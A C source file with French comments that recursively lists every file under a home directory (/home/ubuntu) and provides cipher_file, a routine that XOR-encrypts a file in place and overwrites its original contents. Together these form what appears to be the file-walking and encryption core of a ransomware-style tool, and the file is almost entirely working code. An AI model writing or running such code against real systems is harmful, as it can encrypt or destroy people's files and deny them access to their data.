#include "../includes/file_interact.h"

/*********************************************************************
find_files permet de trouver de maniere recursive les fichiers d'une
arboraissance pour ce code par default la recherche commance dans
/home/ubuntu

input : fichier_t** -> liste chaine qui serrat remplie de nom de
                       fichier

output: _ERROR_NOT_NULL_ -> si la liste chaine est deja initialise
        0                -> execution realise sans erreurs
*********************************************************************/
int find_files(fichier_t **files) {
	DIR *dir;
	struct dirent *dent;
	fichier_t *dossiers = NULL;
	fichier_t *currenteFile = (*files);

	if ((*files) != NULL)
		return _ERROR_NOT_NULL_;

	dir = opendir(BEGIN_DIR);
	if (dir != NULL) {
		while ((dent=readdir(dir)) != NULL) {
			if (dent->d_name[0] != '.') {

				if (dent->d_type == 4) {
					add_directory_in_list(&dossiers, BEGIN_DIR, dent->d_name);
				} else {
					if (currenteFile == NULL) {
						(*files) = new_file(BEGIN_DIR, dent->d_name);
						currenteFile = (*files);
					} else {
						currenteFile->next = new_file(BEGIN_DIR, dent->d_name);
						currenteFile = currenteFile->next;
					}
				}
			}
		}
	}
	closedir(dir);
	dir = NULL;

	while (dossiers != NULL) {
		dir = opendir(dossiers->fileLink);
		if (dir != NULL) {
			while ((dent=readdir(dir)) != NULL) {
				if (dent->d_name[0] != '.') {

					if (dent->d_type == 4) {
						add_directory_in_list(&dossiers, dossiers->fileLink, dent->d_name);
					} else {
						if (currenteFile == NULL) {
							(*files) = new_file(dossiers->fileLink, dent->d_name);
							currenteFile = (*files);
						} else {
							currenteFile->next = new_file(dossiers->fileLink, dent->d_name);
							currenteFile = currenteFile->next;
						}
					}
				}
			}
		}

		closedir(dir);
		dir = NULL;
		depiler_fichier(&dossiers);
	}
	clear_list_file(&dossiers);

	return 0;
}

/*********************************************************************
add_directory_in_list permet pour une list de dossier d'ajouter un
element a la fin de la chaine

input : fichier_t** -> la liste chaine qui contient les dossiers
        char*       -> chemin pour y acceder
        char*       -> nom du dossier

output: 0 -> execution realise sans erreurs
*********************************************************************/
int add_directory_in_list(fichier_t **dossiers, char *dirName, char *fileName) {
	fichier_t *currente = (*dossiers);

	if(currente == NULL) {
		(*dossiers) = new_file(dirName, fileName);
		return 0;
	}

	while(currente->next != NULL)
		currente = currente->next;

	currente->next = new_file(dirName, fileName);
	return 0;
}

/*********************************************************************
new_file permet d'initialise un bloc de la liste chaine pour pouvoir
l'ajoute

input : char* -> chemin pour y acceder
        char* -> nom du fichier

output: fichier_t* -> addr du nouveau bloc creer
*********************************************************************/
fichier_t *new_file(char *dirName, char *fileName) {
	fichier_t *newFile = NULL;

	newFile = malloc(sizeof(fichier_t));
	if (newFile == NULL)
		return (fichier_t*)_ERROR_CANT_INIT_;

	strcpy(newFile->fileLink, dirName);
	strcat(newFile->fileLink, "/");
	strcat(newFile->fileLink, fileName);
	newFile->next = NULL;

	return newFile;
}

/*********************************************************************
clear_list_file permet de supprimer la liste chaine de type fichier_t
ou struct Fichier. La liste chaine serrat repacer a NULL

input : fichier_t** -> liste chaine a supprimer

output: 0 -> execution realise sans erreurs
*********************************************************************/
int clear_list_file(fichier_t **files) {
	fichier_t *file = (*files);

	while(file != NULL) {
		(*files) = (*files)->next;
		free(file);
		file = (*files);
	}
	return 0;
}

/*********************************************************************
draw_files permet d'afficher le contenue d'une liste chaine

input : fichier_t* -> liste de chaine a afficher

output: none
*********************************************************************/
void draw_files(fichier_t *files) {
	while(files != NULL) {
		printf("%s\n", files->fileLink);
		files = files->next;
	}
}

/*********************************************************************
depiler_fichier permet de supprimer le premier element de la liste
chaine

input : fichier_t** -> liste chaine dont il faut faire l'operation

output: 0 -> execution realise sans erreurs
*********************************************************************/
int depiler_fichier(fichier_t **files) {
	fichier_t *toFree = (*files);

	if ((*files) == NULL)
		return 0;

	(*files) = (*files)->next;
	free(toFree);
	return 0;
}

/*********************************************************************
cipher_file permet de chiffrer un fichier avec une clef simplement
avec des XOR

input : char* -> fichier a chiffrer
        char* -> clef de chiffrement

output: _ERROR_CANT_OPEN_ -> si le fichier ne peut etre ouvert
        0                 -> execution realise sans erreurs
*********************************************************************/
int cipher_file(char *file, char *key) {
	int  keySize = strlen(key);
	int  keyIndex = 0;
	int  bufferIndex = 0;
	int  fdFile = 0;
	char buffer[1025];
	int  readChar = 0;
	int  inReading = 0;

	fdFile = open(file, O_RDWR | O_CREAT);
	if(fdFile == -1)
		return _ERROR_CANT_OPEN_;

	while( (inReading = read(fdFile, buffer, sizeof(char)*1024)) > 0 ) {
		while(bufferIndex < inReading) {
			buffer[bufferIndex] = buffer[bufferIndex] ^ key[keyIndex++];
			bufferIndex++;
			if(keyIndex >= keySize)
				keyIndex = 0;
		}

		lseek(fdFile, readChar, SEEK_SET);
		write(fdFile, buffer, sizeof(char)*inReading);

		readChar += inReading;
		bzero(buffer, sizeof(char)*inReading);
		bufferIndex = 0;
	}
	close(fdFile);
	return 0;
}



























